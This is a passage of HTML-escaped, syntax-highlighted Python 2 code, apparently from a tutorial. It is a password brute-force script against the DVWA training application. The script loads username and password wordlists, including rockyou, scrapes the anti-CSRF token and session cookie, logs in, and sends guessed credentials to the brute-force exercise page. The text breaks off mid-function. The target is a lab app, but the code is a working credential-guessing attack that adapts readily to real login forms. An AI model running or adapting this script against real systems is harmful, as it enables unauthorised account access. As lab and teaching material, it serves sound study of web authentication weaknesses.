&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;user_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'/usr/share/seclists/Usernames/top_shortlist.txt'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;pass_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'/usr/share/seclists/Passwords/rockyou.txt'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Value to look for in response header (Whitelisting)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="n"&gt;success&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'Welcome to the password protected area'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Get the anti-CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;csrf_token&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;''&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Make the request to the URL&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;#print &amp;quot;\n[i] URL: %s/%s&amp;quot; % (target, path)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{0}/{1}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allow_redirects&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[!] csrf_token: Failed to connect (URL: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Extract anti-CSRF token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;soup&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;user_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;soup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;user_token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;})[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;value&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;#print &amp;quot;[i] user_token: %s&amp;quot; % user_token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Extract session information&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;session_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;PHPSESSID=(.*?);&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;set-cookie&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;session_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;#print &amp;quot;[i] session_id: %s&amp;quot; % session_id&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Login to DVWA core&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;dvwa_login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# POST data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;dvwa_user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;dvwa_pass&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;user_token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Cookie data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;PHPSESSID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;security&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;sec_level&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Make the request to the URL&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] URL: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/login.php&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] Data: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;[i] Cookie: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;cookie&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{0}/login.php&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allow_redirects&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[!] dvwa_login: Failed to connect (URL: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/login.php).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Wasn't it a redirect?&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;301&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;302&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error again) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[!] dvwa_login: Page didn't response correctly (Response: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Did we log in successfully?&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Location&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s"&gt;'index.php'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[!] dvwa_login: Didn't login (Header: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;  user: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;  password: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;  user_token: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;  session_id: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;          &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Location&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;dvwa_user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dvwa_pass&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# If we got to here, everything should be okay!&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Logged in! (&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dvwa_user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dvwa_pass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;# Make the request to-do the brute force&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;url_request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# GET data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;user_token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;user_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Cookie data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="n"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;PHPSESSID&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;session_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="s"&gt;&amp;quot;security&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;sec_level&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Make the request to the URL&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;#print &amp;quot;\n[i] URL: %s/vulnerabilities/brute/&amp;quot; % target&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;#print &amp;quot;[i] Data: %s&amp;quot; % data&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;#print &amp;quot;[i] Cookie: %s&amp;quot; % cookie&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{0}/vulnerabilities/brute/&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allow_redirects&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error) &amp;amp; Stop execution of our request&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;[!] url_request: Failed to connect (URL: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;/vulnerabilities/brute/).&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;[i] Quitting.&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="c"&gt;# Was it a ok response?&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;        &lt;span class="c"&gt;# Feedback for the user (there was an error again) &amp;amp; Stop execution of our request&lt;/span&gt;
